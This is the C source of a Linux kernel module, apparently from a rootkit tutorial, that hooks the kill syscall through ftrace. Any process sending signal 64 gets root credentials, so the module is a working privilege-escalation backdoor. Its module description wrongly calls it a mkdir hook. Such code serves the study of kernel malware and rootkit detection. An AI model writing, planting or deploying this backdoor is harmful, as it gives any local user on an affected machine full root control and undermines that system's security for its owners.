#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
#define PTREGS_SYSCALL_STUBS 1
#endif

// importent! func fot get current process got root privilege
void set_root(void)
{
    struct cred *current_creds;
    current_creds = prepare_creds();

    if (current_creds == NULL)
        return;

    /* Set the credentials to root */
    current_creds->uid.val = current_creds->gid.val = 0;
    current_creds->euid.val = current_creds->egid.val = 0;
    current_creds->suid.val = current_creds->sgid.val = 0;
    current_creds->fsuid.val = current_creds->fsgid.val = 0;

    commit_creds(current_creds);
}

// hook sys_kill
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    // A func for root backdoor
    void set_root(void);

    int sig = regs->si;

    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        // return for hook, nothing will receive this 64 sig
        return 0;
    }

    return orig_kill(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);